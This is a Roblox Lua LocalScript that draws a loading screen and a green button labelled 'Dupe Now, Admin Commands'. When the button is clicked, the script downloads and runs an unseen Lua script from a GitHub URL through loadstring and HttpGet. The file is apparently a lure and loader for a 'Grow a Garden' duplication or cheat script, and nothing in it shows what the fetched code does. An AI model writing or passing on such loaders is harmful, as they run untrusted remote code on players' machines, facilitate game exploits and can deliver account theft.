-- LocalScript in StarterPlayerScripts or StarterGui

-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MyGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the Loading Screen
local loadingScreen = Instance.new("Frame")
loadingScreen.Size = UDim2.new(1, 0, 1, 0) -- Fullscreen
loadingScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
loadingScreen.Parent = screenGui

-- Create a loading label
local loadingLabel = Instance.new("TextLabel")
loadingLabel.Size = UDim2.new(1, 0, 0.1, 0)
loadingLabel.Position = UDim2.new(0, 0, 0.45, 0)
loadingLabel.Text = "Loading..."
loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingLabel.TextScaled = true
loadingLabel.BackgroundTransparency = 1
loadingLabel.Parent = loadingScreen

-- Create the main GUI Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Position = UDim2.new(0.25, 0, 0.25, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mainFrame.Parent = screenGui

-- Create the button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.8, 0, 0.2, 0)
button.Position = UDim2.new(0.1, 0, 0.4, 0)
button.Text = "Dupe Now, Admin Commands"
button.TextColor3 = Color3.fromRGB(0, 0, 0)
button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
button.Parent = mainFrame

-- Animation for the button
button.MouseEnter:Connect(function()
    button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
end)

button.MouseLeave:Connect(function()
    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
end)

-- Button click event
button.MouseButton1Click:Connect(function()
    -- Close the GUI
    screenGui:Destroy()
    
    -- Load the external script
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/lowznt/growagarden/main/gagscript.lua"))()
    end)

    if not success then
        warn("Failed to execute script: " .. err)
    end
end)

-- Animation for loading screen
for i = 1, 10 do
    loadingLabel.TextTransparency = i * 0.1
    wait(0.1)
end

loadingScreen:Destroy() -- Remove loading screen after animation
